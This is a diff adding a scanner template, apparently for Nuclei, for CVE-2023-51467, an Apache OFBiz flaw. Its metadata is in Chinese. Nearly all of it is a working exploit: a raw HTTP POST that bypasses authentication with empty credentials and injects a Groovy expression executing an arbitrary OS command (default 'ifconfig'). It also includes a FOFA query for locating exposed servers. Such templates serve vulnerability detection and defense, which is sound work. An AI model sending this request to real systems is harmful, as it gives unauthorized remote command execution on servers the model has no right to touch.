@@ -1,0 +1,48 @@
+id: CVE-2023-51467
+
+info:
+  name: OFBiz RCE漏洞
+  author: pipichen
+  severity: critical
+  description: 这个漏洞的原因是对于CVE-2023-49070的不完全修复。在Apache OFBiz 18.12.10版本中，官方移除了可能导致RCE漏洞的XMLRPC组件，但没有修复权限绕过问题。来自长亭科技的安全研究员枇杷哥利用这一点找到了另一个可以导致RCE的方法：Groovy表达式注入。
+  metadata:
+    fofa-query: app="Apache_OFBiz" && icon_hash="-1192636260"
+    verified: true
+  reference:
+    - https://www.cnblogs.com/CVE-Lemon/p/17962663
+  tags: rce,OFBiz,cve,others
+
+variables:
+  cmd: "ifconfig"
+
+http:
+  - raw:
+      - |
+        POST /webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: JSESSIONID=DBBCA93F5357FB80D75342ACF6E94FE5.jvm1; OFBiz.Visitor=63308
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: none
+        Sec-Fetch-User: ?1
+        Te: trailers
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 55
+
+        groovyProgram=throw+new+Exception('{{cmd}}'.execute().text);
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "eth0: flags"
+          - "lo: flags"
+          - "<p>java.lang.Exception:"
+        condition: and
+# digest: 490a0046304402206f76d26cb24886eeb99648be12c2fa27c7fb8c42f74a776d9a8d3dc3349f89ff0220297c2d3b3ee944b00f3d8f05c669e0d72dd7a70dfb686e307927b4efca5a4fbf:6b2dd5af372f02ed15a56faf8ad98cf9
